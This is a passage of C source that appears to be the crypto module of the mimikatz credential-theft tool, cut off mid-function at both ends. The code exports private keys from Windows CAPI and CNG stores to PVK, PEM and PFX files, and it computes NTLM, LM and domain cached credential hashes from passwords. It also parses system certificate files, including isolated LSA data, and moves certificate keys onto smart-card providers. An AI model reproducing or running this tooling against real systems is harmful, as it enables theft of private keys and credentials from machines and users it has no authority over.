							if(nCryptReturn == ERROR_SUCCESS)
							{
								pExt = pCngElem->pszExtension;
								if(pCngElem->needPVKHeader)
								{
									pvkHeader.cbPvk = szExport;
									RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
								}
								else
								{
									if(kull_m_string_EncodeB64_headersA("PRIVATE KEY", pExport, szPVK, &b64Out))
									{
										LocalFree(pExport);
										pExport = (PBYTE) b64Out;
										szPVK = lstrlenA(b64Out);
									}
									else PRINT_ERROR_AUTO(L"kull_m_string_EncodeB64_headers");
								}
							}
							else
							{
								PRINT_ERROR(L"NCryptExportKey(%s -- data): 0x%08x\n", pCngElem->pszBlobType, nCryptReturn);
								pExport = (PBYTE) LocalFree(pExport);
							}
						}
					}
					else PRINT_ERROR(L"NCryptExportKey(%s -- init): 0x%08x\n", pCngElem->pszBlobType, nCryptReturn);
				}
				else PRINT_ERROR(L"No suitable export type for key group: %s\n", cngAlg);
				LocalFree(cngAlg);
			}
		}
		__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND) {}
	}
	if(pExport)
	{
		if(filenamebuffer = kuhl_m_crypto_generateFileName(store, provType, index, name, pExt))
		{
			if(isExported = kull_m_file_writeData(filenamebuffer, pExport, szPVK))
				kprintf(L"OK - \'%s\'\n", filenamebuffer);
			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			LocalFree(filenamebuffer);
		}
		LocalFree(pExport);
	}
}

void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, const wchar_t * systemStore, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	wchar_t *fileNameBuffer;
	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 
	PCCERT_CONTEXT  pCertContextCopy = NULL;
	CRYPT_DATA_BLOB bDataBlob = {0, NULL};

	if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"der"))
	{
		kprintf(L"\tPublic export  : ");
		if(kull_m_file_writeData(fileNameBuffer, pCertificate->pbCertEncoded, pCertificate->cbCertEncoded))
			kprintf(L"OK - \'%s\'\n", fileNameBuffer);
		else PRINT_ERROR_AUTO(L"CreateFile");
		LocalFree(fileNameBuffer);
	}
	else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	
	if(havePrivateKey)
	{
		if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"pfx"))
		{
			kprintf(L"\tPrivate export : ");
			if(CertAddCertificateContextToStore(hTempStore, pCertificate, CERT_STORE_ADD_NEW, &pCertContextCopy))
			{
				if(kull_m_crypto_exportPfx(hTempStore, fileNameBuffer))
					kprintf(L"OK - \'%s\'\n", fileNameBuffer);
				CertFreeCertificateContext(pCertContextCopy);
			}
			else PRINT_ERROR_AUTO(L"CertAddCertificateContextToStore");
			LocalFree(fileNameBuffer);
		}
		else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	}
	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
}

wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext)
{
	wchar_t * buffer;
	size_t charCount = wcslen(term0) + 1 + wcslen(term1) + 1 + 10 + 1 + wcslen(name) + 1 + wcslen(ext) + 1;

	if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%s_%s_%u_%s.%s", term0, term1, index, name, ext) == -1)
			buffer = (wchar_t *) LocalFree(buffer);
		else
			kull_m_file_cleanFilename(buffer);
	}
	return buffer;
}

NTSTATUS kuhl_m_crypto_hash(int argc, wchar_t * argv[])
{
	PCWCHAR szCount, szPassword = NULL, szUsername = NULL;
	UNICODE_STRING uPassword, uUsername;/*, uTmp;
	ANSI_STRING aTmp;*/
	OEM_STRING oTmp;
	DWORD count = 10240;
	BYTE hash[LM_NTLM_HASH_LENGTH], dcc[LM_NTLM_HASH_LENGTH], md5[MD5_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], sha2[32];
	
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
		count = wcstoul(szCount, NULL, 0);

	RtlInitUnicodeString(&uPassword, szPassword);
	RtlInitUnicodeString(&uUsername, szUsername);
	if(NT_SUCCESS(RtlCalculateNtOwfPassword(&uPassword, hash)))
	{
		kprintf(L"NTLM: "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		if(szUsername)
		{
			if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, 0)))
			{
				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, count)))
				{
					kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				}
			}
		}
	}

	//if(NT_SUCCESS(RtlUpcaseUnicodeString(&uTmp, &uPassword, TRUE)))
	//{
	//	if(NT_SUCCESS(RtlUnicodeStringToAnsiString(&aTmp, &uTmp, TRUE)))
	//	{
	//		if(NT_SUCCESS(RtlDigestLM(aTmp.Buffer, hash)))
	//		{
	//			kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
	//		}
	//		RtlFreeAnsiString(&aTmp);
	//	}
	//	RtlFreeUnicodeString(&uTmp);
	//}

	if(NT_SUCCESS(RtlUpcaseUnicodeStringToOemString(&oTmp, &uPassword, TRUE)))
	{
		if(NT_SUCCESS(RtlCalculateLmOwfPassword(oTmp.Buffer, hash)))
		{
			kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		}
		RtlFreeOemString(&oTmp);
	}

	if(kull_m_crypto_hash(CALG_MD5, uPassword.Buffer, uPassword.Length, md5, MD5_DIGEST_LENGTH))
		kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA1, uPassword.Buffer, uPassword.Length, sha1, SHA_DIGEST_LENGTH))
		kprintf(L"SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA_256, uPassword.Buffer, uPassword.Length, sha2, 32))
		kprintf(L"SHA2: "); kull_m_string_wprintf_hex(sha2, 32, 0); kprintf(L"\n");

	return STATUS_SUCCESS;
}

BOOL kuhl_m_crypto_system_data(PBYTE data, DWORD len, PCWCHAR originalName, BOOL isExport)
{
	BOOL status = FALSE;
	PCWCHAR name;
	PKUHL_M_CRYPTO_CERT_PROP prop;
	PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO provInfo;

	for(prop = (PKUHL_M_CRYPTO_CERT_PROP) data; (PBYTE) prop < (data + len); prop = (PKUHL_M_CRYPTO_CERT_PROP) ((PBYTE) prop + FIELD_OFFSET(KUHL_M_CRYPTO_CERT_PROP, data) + prop->size))
	{
		name = kull_m_crypto_cert_prop_id_to_name(prop->dwPropId);
		kprintf(L"[%04x/%x] %s\n", prop->dwPropId, prop->flags, name ? name : L"?");
		if(prop->size)
		{
			kprintf(L"  ");
			switch(prop->dwPropId)
			{
			case CERT_KEY_PROV_INFO_PROP_ID:
				kprintf(L"Provider info:\n");
				provInfo = (PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO) prop->data;
				if(provInfo->offsetContainerName)
					kprintf(L"\tKey Container  : %s\n", prop->data + provInfo->offsetContainerName);
				if(provInfo->offsetProvName)
					kprintf(L"\tProvider       : %s\n", prop->data + provInfo->offsetProvName);
				name = kull_m_crypto_provider_type_to_name(provInfo->dwProvType);
				kprintf(L"\tProvider type  : %s (%u)\n", name ? name : L"?", provInfo->dwProvType);
				kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(provInfo->dwKeySpec), provInfo->dwKeySpec);
				kprintf(L"\tFlags          : %08x\n", provInfo->dwFlags);
				kprintf(L"\tParam (todo)   : %08x / %08x\n", provInfo->cProvParam, provInfo->offsetRgProvParam);
				break;
			case CERT_FRIENDLY_NAME_PROP_ID:
			case CERT_OCSP_CACHE_PREFIX_PROP_ID:
			case 101: //CERT_SMART_CARD_READER_PROP_ID
				kprintf(L"%.*s", prop->size / sizeof(wchar_t), prop->data);
				break;
			case CERT_cert_file_element:
			case CERT_crl_file_element:
			case CERT_ctl_file_element:
			case CERT_keyid_file_element:
				kuhl_m_crypto_file_rawData(prop, originalName, isExport);
				break;
			case 118: // CERT_ISOLATED_KEY_PROP_ID
				kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) prop->data, NULL, NULL);
				kprintf(L"\n");
				break;
			case CERT_SHA1_HASH_PROP_ID:
			case CERT_MD5_HASH_PROP_ID :
			case CERT_SIGNATURE_HASH_PROP_ID:
			case CERT_ISSUER_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_ISSUER_SERIAL_NUMBER_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_NAME_MD5_HASH_PROP_ID:
			case CERT_KEY_IDENTIFIER_PROP_ID:
				//
			default:
				kull_m_string_wprintf_hex(prop->data, prop->size, 0);
				break;
			}
			kprintf(L"\n");
		}
	}

	return status;
}

BOOL CALLBACK kuhl_m_crypto_system_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	PBYTE fileData;
	DWORD fileLenght;
	if(fullpath)
	{
		kprintf(L"\n* File: \'%s\'\n", fullpath);
		if(kull_m_file_readData(fullpath, &fileData, &fileLenght))
		{
			kuhl_m_crypto_system_data(fileData, fileLenght, fullpath, *(PBOOL) pvArg);
			LocalFree(fileData);
		}
	}
	return FALSE;
}

NTSTATUS kuhl_m_crypto_system(int argc, wchar_t * argv[])
{
	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	PCWCHAR infile;

	if(kull_m_string_args_byName(argc, argv, L"file", &infile, NULL)) // TODO: registry & hive
	{
		if(PathIsDirectory(infile))
		{
			kprintf(L"* Directory: \'%s\'\n", infile);
			kull_m_file_Find(infile, NULL, FALSE, 0, FALSE, FALSE, kuhl_m_crypto_system_directory, &isExport);
		}
		else kuhl_m_crypto_system_directory(0, infile, PathFindFileName(infile), &isExport);
	}
	else PRINT_ERROR(L"Input Microsoft Crypto Certificate file needed (/file:filename|directory)\n");
	return STATUS_SUCCESS;
}

void kuhl_m_crypto_file_rawData(PKUHL_M_CRYPTO_CERT_PROP prop, PCWCHAR inFile, BOOL isExport)
{
	PCWCHAR type, file;
	wchar_t * buffer;
	size_t charCount;

	switch(prop->dwPropId)
	{
	case CERT_cert_file_element:
		type = L"der";
		break;
	case CERT_crl_file_element:
		type = L"crl";
		break;
	case CERT_ctl_file_element:
		type = L"ctl";
		break;
	case CERT_keyid_file_element:
		type = L"keyid";
		break;
	default:
		type = NULL;
	}

	if(type)
	{
		kprintf(L"Data: ");
		kull_m_string_wprintf_hex(prop->data, prop->size, 0);
		kprintf(L"\n");
		if(isExport)
		{
			kprintf(L"  ");
			file = PathFindFileName(inFile);
			charCount = wcslen(file) + 1 + wcslen(type) + 1;
			if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
			{
				if(swprintf_s(buffer, charCount, L"%s.%s", file, type) > 0)
				{
					if(kull_m_file_writeData(buffer, prop->data, prop->size))
						kprintf(L"Saved to file: %s\n", buffer);
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
				}
				LocalFree(buffer);
			}
		}
	}
}

NTSTATUS kuhl_m_crypto_c_cert_to_hw(int argc, wchar_t * argv[])
{
	LPCWSTR szStore, szName, szPin;
	HCERTSTORE hCertStore;
	PCCERT_CONTEXT pCertCtx;
	BOOL isExported = FALSE;

	HCRYPTPROV hCapiProv;
	HCRYPTKEY hCapiKey;
	NCRYPT_PROV_HANDLE hCngProv;
	NCRYPT_KEY_HANDLE hCngKey;
	PBYTE keyblob;
	DWORD dwkeyblob;
	SECURITY_STATUS nCryptReturn;

	LPSTR aPin = NULL;
	HCRYPTPROV hProvCERT;
	HCRYPTKEY hKeyCERT;
	CRYPT_KEY_PROV_INFO *source, keyInfos = {NULL, MS_SCARD_PROV, PROV_RSA_FULL, 0, 0, NULL, 0};

	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"LOCAL_MACHINE");
	if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
	{
		kprintf(L"Cert store     : %s\n", szStore);
		if(hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, kull_m_crypto_system_store_to_dword(szStore) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
		{
			kprintf(L"Cert name      : %s\n", szName);
			if(pCertCtx = CertFindCertificateInStore(hCertStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szName, NULL))
			{
				kprintf(L"Cert validity  : "); kull_m_string_displayLocalFileTime(&pCertCtx->pCertInfo->NotBefore);
				kprintf(L" -> "); kull_m_string_displayLocalFileTime(&pCertCtx->pCertInfo->NotAfter); kprintf(L"\n");
				if(CertGetCertificateContextProperty(pCertCtx, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwkeyblob))
				{
					if(source = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwkeyblob))
					{
						if(CertGetCertificateContextProperty(pCertCtx, CERT_KEY_PROV_INFO_PROP_ID, source, &dwkeyblob))
						{
							keyInfos.dwKeySpec = source->dwKeySpec;
							kprintf(L"Src provider   : %s\nSrc container  : %s\n", source->pwszProvName, source->pwszContainerName);
							if(source->dwProvType)
							{
								if(CryptAcquireContext(&hCapiProv, source->pwszContainerName, source->pwszProvName, source->dwProvType, source->dwFlags))
								{
									if(CryptGetUserKey(hCapiProv, source->dwKeySpec, &hCapiKey))
									{
										if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &dwkeyblob))
										{
											if(keyblob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
											{
												if(!(isExported = CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, keyblob, &dwkeyblob)))
												{
													PRINT_ERROR_AUTO(L"CryptExportKey(data)");
													LocalFree(keyblob);
												}
											}
										}
										else PRINT_ERROR_AUTO(L"CryptExportKey(init)");
										CryptDestroyKey(hCapiKey);
									}
									else PRINT_ERROR_AUTO(L"CryptGetUserKey");
									CryptReleaseContext(hCapiProv, 0);
								}
								else PRINT_ERROR_AUTO(L"CryptAcquireContext");
							}
							else
							{
								__try
								{
									nCryptReturn = NCryptOpenStorageProvider(&hCngProv, source->pwszProvName, 0);
									if(nCryptReturn == ERROR_SUCCESS)
									{
										nCryptReturn = NCryptOpenKey(hCngProv, &hCngKey, source->pwszContainerName, 0, source->dwFlags);
										if(nCryptReturn == ERROR_SUCCESS)
										{
											nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, NULL, 0, &dwkeyblob, 0);
											if(nCryptReturn == ERROR_SUCCESS)
											{
												if(keyblob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
												{
													nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, keyblob, dwkeyblob, &dwkeyblob, 0);
													if(!(isExported = (nCryptReturn == ERROR_SUCCESS)))
													{
														PRINT_ERROR(L"NCryptExportKey(data): %08x\n", nCryptReturn);
														LocalFree(keyblob);
													}
												}
											}
											else PRINT_ERROR(L"NCryptExportKey(init): %08x\n", nCryptReturn);
											NCryptFreeObject(hCngKey);
										}
										else PRINT_ERROR(L"NCryptOpenKey: %08x\n", nCryptReturn);
										NCryptFreeObject(hCngProv);
									}
									else PRINT_ERROR(L"NCryptOpenStorageProvider: %08x\n", nCryptReturn);
								}
								__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
								{
									PRINT_ERROR(L"No CNG?\n");
								}
							}
						}
						LocalFree(source);
					}
				}
				
				if(isExported)
				{
					kull_m_string_args_byName(argc, argv, L"csp", &keyInfos.pwszProvName, MS_SCARD_PROV);
					if(keyInfos.pwszContainerName = kull_m_string_getRandomGUID())
					{
						kprintf(L"Dst provider   : %s\nDst container  : %s\n", keyInfos.pwszProvName, keyInfos.pwszContainerName);
						if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
						{
							if(aPin = kull_m_string_unicode_to_ansi(szPin))
							{
								if(CryptAcquireContext(&hProvCERT, NULL, keyInfos.pwszProvName, keyInfos.dwProvType, ((MIMIKATZ_NT_MAJOR_VERSION > 5) ? CRYPT_DEFAULT_CONTAINER_OPTIONAL : 0)))
								{
									if(CryptSetProvParam(hProvCERT, PP_KEYEXCHANGE_PIN, (const BYTE *) aPin, 0))
										keyInfos.dwFlags = CRYPT_SILENT;
									else
									{
										keyInfos.dwFlags = 0;
										PRINT_ERROR_AUTO(L"CryptSetProvParam(PP_KEYEXCHANGE_PIN)");
									}
									CryptReleaseContext(hProvCERT, 0);
								}
								else PRINT_ERROR_AUTO(L"CryptAcquireContext(pin)");
							}
						}

						if(CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_NEWKEYSET | keyInfos.dwFlags))
						{
							if(aPin)
							{
								if(!CryptSetProvParam(hProvCERT, PP_KEYEXCHANGE_PIN, (const BYTE *) aPin, 0))
									PRINT_ERROR_AUTO(L"CryptSetProvParam(PP_KEYEXCHANGE_PIN)");
								LocalFree(aPin);
							}
							kprintf(L"Dst Key Import : ");
							if(CryptImportKey(hProvCERT, keyblob, dwkeyblob, 0, 0, &hKeyCERT))
							{
								kprintf(L"OK\nDst Cert Assoc : ");
								if(isExported = CryptSetKeyParam(hKeyCERT, KP_CERTIFICATE, pCertCtx->pbCertEncoded, 0))
									kprintf(L"OK\n");
								else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
								CryptDestroyKey(hKeyCERT);
							}
							else PRINT_ERROR_AUTO(L"CryptImportKey");
						}
						else PRINT_ERROR_AUTO(L"CryptAcquireContext");
						LocalFree(keyInfos.pwszContainerName);
					}
					LocalFree(keyblob);
				}
				CertFreeCertificateContext(pCertCtx);
			}
			else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
			CertCloseStore(hCertStore, CERT_CLOSE_STORE_FORCE_FLAG);
		}
		else PRINT_ERROR_AUTO(L"CertOpenStore");
	}
	else PRINT_ERROR(L"/name:kiwi needed\n");

	return STATUS_SUCCESS;
}

BOOL kuhl_m_crypto_FreeHandleCert(HCERTSTORE *hStore, PCCERT_CONTEXT *pCertContext)
{
	if(*pCertContext)
	{
		if(CertFreeCertificateContext(*pCertContext))
			*pCertContext = NULL;
		else PRINT_ERROR_AUTO(L"CertFreeCertificateContext");
	}
	if(*hStore)
	{
		if(CertCloseStore(*hStore, CERT_CLOSE_STORE_FORCE_FLAG))
			*hStore = 0;
		else PRINT_ERROR_AUTO(L"CertCloseStore");
	}
	return !(*pCertContext || *hStore);
}

BOOL kuhl_m_crypto_ImportCert(LPCVOID data, DWORD dwSize, HCERTSTORE *hStore, PCCERT_CONTEXT *pCertContext)
{
	BOOL status = FALSE;
	CERT_BLOB blobCert = {dwSize, (BYTE *) data};
	DWORD dwMsgAndCertEncodingType = 0, dwContentType = 0, dwFormatType = 0;
	*hStore = 0;
	*pCertContext = NULL;
	if(!(status = CryptQueryObject(CERT_QUERY_OBJECT_BLOB, &blobCert, CERT_QUERY_CONTENT_FLAG_CERT, CERT_QUERY_FORMAT_FLAG_ALL, 0, &dwMsgAndCertEncodingType, &dwContentType, &dwFormatType, hStore, NULL, (const void **) pCertContext)))
		PRINT_ERROR_AUTO(L"CryptQueryObject");
	//if(*hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL))
	//{
	//	if(CertAddEncodedCertificateToStore(*hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, (const BYTE *) data, dwSize, CERT_STORE_ADD_NEW, pCertContext))
	//		status = TRUE;
	//	else PRINT_ERROR_AUTO(L"CertAddEncodedCertificateToStore");
	//}
	//else PRINT_ERROR_AUTO(L"CertOpenStore");
	//if(!status)
	//	kuhl_m_crypto_FreeHandleCert(hStore, pCertContext);
	return status;
}

BOOL kuhl_m_crypto_NCrypt_KeyFromMagic(LPCVOID key, DWORD size, NCRYPT_PROV_HANDLE *hProv, NCRYPT_KEY_HANDLE *hKey, BOOL *wasRecognized)
{
	BOOL status = FALSE;
	LPCWSTR type = NULL;
	if(wasRecognized)
		*wasRecognized = FALSE;
	if(size >= sizeof(DWORD))
	{
		if(wasRecognized)
			*wasRecognized = TRUE;
		switch(*(PDWORD) key)
		{
		case PVK_MAGIC:
			if((((PPVK_FILE_HDR) key)->dwEncryptType == 0) && (((PPVK_FILE_HDR) key)->cbEncryptData == 0) && (((PPVK_FILE_HDR) key)->cbPvk == (size - sizeof(PVK_FILE_HDR))))
				status = kuhl_m_crypto_NCrypt_KeyFromMagic((LPCBYTE) key + sizeof(PVK_FILE_HDR), size - sizeof(PVK_FILE_HDR), hProv, hKey, NULL);
			else PRINT_ERROR(L"Invalid PVK file (encryption or size)\n");
			break;
		case (PRIVATEKEYBLOB | (CUR_BLOB_VERSION << 8)):
			switch(((BLOBHEADER *) key)->aiKeyAlg)
			{
			case CALG_RSA_KEYX:
			case CALG_RSA_SIGN:
				if(((PRSA_GENERICKEY_BLOB) key)->RsaKey.magic == '2ASR'/*BCRYPT_RSAPRIVATE_MAGIC*/) // BCRYPT_DH_PRIVATE_MAGIC
					type = LEGACY_RSAPRIVATE_BLOB; // LEGACY_DH_PRIVATE_BLOB
				else PRINT_ERROR(L"Bad RSA magic (0x%08x)\n", ((PRSA_GENERICKEY_BLOB) key)->RsaKey.magic);
				break;
			case CALG_DSS_SIGN:
				if(((PDSS_GENERICKEY_BLOB) key)->DsaKey.magic == '2SSD')
					type = LEGACY_DSA_V2_PRIVATE_BLOB;
				else PRINT_ERROR(L"Bad DSAv2 magic (0x%08x)\n", ((PRSA_GENERICKEY_BLOB) key)->RsaKey.magic);
				break;
			default:
				PRINT_ERROR(L"Invalid BLOBv2 aiKeyAlg: 0x%08x\n", ((BLOBHEADER *) key)->aiKeyAlg);
			}
			break;
		case (PRIVATEKEYBLOB | ((CUR_BLOB_VERSION + 1) << 8)):
			switch(((BLOBHEADER *) key)->aiKeyAlg)
			{
			case CALG_DSS_SIGN:
				if(((PDSS_GENERICKEY3_BLOB) key)->DsaKey.magic == '4SSD')
					if(((PDSS_GENERICKEY3_BLOB) key)->DsaKey.bitlenQ == ((PDSS_GENERICKEY3_BLOB) key)->DsaKey.bitlenX)
						type = LEGACY_DSA_PRIVATE_BLOB;
					else PRINT_ERROR(L"Bad DSAv3 size - Q:%u & X:%u\n", ((PDSS_GENERICKEY3_BLOB) key)->DsaKey.bitlenQ, ((PDSS_GENERICKEY3_BLOB) key)->DsaKey.bitlenX);
				else PRINT_ERROR(L"Bad DSAv3 magic (0x%08x) or X size\n", ((PDSS_GENERICKEY3_BLOB) key)->DsaKey.magic);
				break;
			default:
				PRINT_ERROR(L"Invalid BLOBv3 aiKeyAlg: 0x%08x\n", ((BLOBHEADER *) key)->aiKeyAlg);
			}
			break;
		case BCRYPT_RSAPRIVATE_MAGIC:
			type = BCRYPT_RSAPRIVATE_BLOB;
			break;
		case BCRYPT_RSAFULLPRIVATE_MAGIC:
			type = BCRYPT_RSAFULLPRIVATE_BLOB;
			break;
		case BCRYPT_ECDH_PRIVATE_P256_MAGIC:
		case BCRYPT_ECDH_PRIVATE_P384_MAGIC:
		case BCRYPT_ECDH_PRIVATE_P521_MAGIC:
		case BCRYPT_ECDSA_PRIVATE_P256_MAGIC:
		case BCRYPT_ECDSA_PRIVATE_P384_MAGIC:
		case BCRYPT_ECDSA_PRIVATE_P521_MAGIC:
			type = BCRYPT_ECCPRIVATE_BLOB;
			break;
		case BCRYPT_ECDH_PRIVATE_GENERIC_MAGIC:
		case BCRYPT_ECDSA_PRIVATE_GENERIC_MAGIC:
			type = BCRYPT_ECCFULLPRIVATE_BLOB;
			break;
		case BCRYPT_DH_PRIVATE_MAGIC:
			type = BCRYPT_DH_PRIVATE_BLOB;
			break;
		case BCRYPT_DSA_PRIVATE_MAGIC:
			type = BCRYPT_DSA_PRIVATE_BLOB;
			break;
		default:
			if(wasRecognized)
				*wasRecognized = FALSE;
		}
		if(!status && type)
			status = kull_m_crypto_NCryptImportKey(key, size, type, hProv, hKey);
	}
	return status;
}

BOOL kuhl_m_crypto_NCrypt_AutoKey(LPCVOID key, DWORD size, NCRYPT_PROV_HANDLE *hProv, NCRYPT_KEY_HANDLE *hKey)
{
	BOOL status = FALSE, wasRecognized;
	DWORD cbBinary = 0, dwFlags = 0;
	BYTE *bBinary;
	PCRYPT_ECC_PRIVATE_KEY_INFO ki; // will be used generic too
	DWORD cbBlob;
	PBCRYPT_ECCKEY_BLOB pEcc;
	DWORD dwEcc;

	status = kuhl_m_crypto_NCrypt_KeyFromMagic(key, size, hProv, hKey, &wasRecognized);
	if(!wasRecognized)
	{
		if(CryptStringToBinaryA((LPCSTR) key, size, CRYPT_STRING_ANY, NULL, &cbBinary, NULL, &dwFlags))
		{
			if(bBinary = (BYTE *) LocalAlloc(LPTR, cbBinary))
			{
				if(CryptStringToBinaryA((LPCSTR) key, size, CRYPT_STRING_ANY, bBinary, &cbBinary, NULL, NULL))
				{
					if(CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_RSA_PRIVATE_KEY, bBinary, cbBinary, CRYPT_DECODE_ALLOC_FLAG, NULL, &ki, &cbBlob))
					{
						status = kull_m_crypto_NCryptImportKey(ki, cbBlob, LEGACY_RSAPRIVATE_BLOB, hProv, hKey);
						LocalFree(ki);
					}
					else if(CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, X509_ECC_PRIVATE_KEY, bBinary, cbBinary, CRYPT_DECODE_ALLOC_FLAG, NULL, &ki, &cbBlob))
					{
						dwEcc = sizeof(BCRYPT_ECCKEY_BLOB) + ki->PublicKey.cbData - 1 + ki->PrivateKey.cbData;
						if(pEcc = (PBCRYPT_ECCKEY_BLOB) LocalAlloc(LPTR, dwEcc))
						{
							pEcc->cbKey = ki->PrivateKey.cbData;
							switch(pEcc->cbKey)
							{
								case 32 /*256*/:
									pEcc->dwMagic = BCRYPT_ECDSA_PRIVATE_P256_MAGIC;
									break;
								case 42 /*384*/:
									pEcc->dwMagic = BCRYPT_ECDSA_PRIVATE_P384_MAGIC;
									break;
								case 66 /*521*/:
									pEcc->dwMagic = BCRYPT_ECDSA_PRIVATE_P521_MAGIC;
									break;
								default:
									;
							}
							if(pEcc->dwMagic)
							{
								RtlCopyMemory((PBYTE) pEcc + sizeof(BCRYPT_ECCKEY_BLOB), ki->PublicKey.pbData + 1, ki->PublicKey.cbData - 1);
								RtlCopyMemory((PBYTE) pEcc + sizeof(BCRYPT_ECCKEY_BLOB) + ki->PublicKey.cbData - 1, ki->PrivateKey.pbData, ki->PrivateKey.cbData);
								status = kull_m_crypto_NCryptImportKey(pEcc, dwEcc, BCRYPT_ECCPRIVATE_BLOB, hProv, hKey);
							}
							else PRINT_ERROR(L"Not a PEM with 256, 384 or 521 bits curve (try generic PRIVATE KEY or PKCS#8)\n");
							LocalFree(pEcc);
						}
						LocalFree(ki);
					}
					else if(CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_PRIVATE_KEY_INFO, bBinary, cbBinary, CRYPT_DECODE_ALLOC_FLAG, NULL, &ki, &cbBlob))
					{
						status = kull_m_crypto_NCryptImportKey(bBinary, cbBinary, NCRYPT_PKCS8_PRIVATE_KEY_BLOB, hProv, hKey);
						LocalFree(ki);
					}
					else PRINT_ERROR(L"Unable to decode format\n");
				}
				else PRINT_ERROR_AUTO(L"CryptStringToBinaryA(data)");
				LocalFree(bBinary);
			}
		}
		else PRINT_ERROR_AUTO(L"CryptStringToBinaryA(init)");
	}
	return status;
}

BOOL kuhl_m_crypto_keyutil_export_pkcs8_file(NCRYPT_KEY_HANDLE hNCryptKey, LPCWSTR szFile)
{
	BOOL status = FALSE;
	SECURITY_STATUS nStatus;
	DWORD dwKey8;
	PBYTE bKey8;
	PSTR aData;

	nStatus = NCryptExportKey(hNCryptKey, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB, NULL, NULL, 0, &dwKey8, 0);
	if(nStatus == ERROR_SUCCESS)
	{
		if(bKey8 = (PBYTE) LocalAlloc(LPTR, dwKey8))
		{
			nStatus = NCryptExportKey(hNCryptKey, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB, NULL, bKey8, dwKey8, &dwKey8, 0);
			if(nStatus == ERROR_SUCCESS)
			{
				if(kull_m_string_EncodeB64_headersA("PRIVATE KEY", bKey8, dwKey8, &aData))
				{
					if(kull_m_file_writeData(szFile, aData, lstrlenA(aData)))
							status = TRUE;
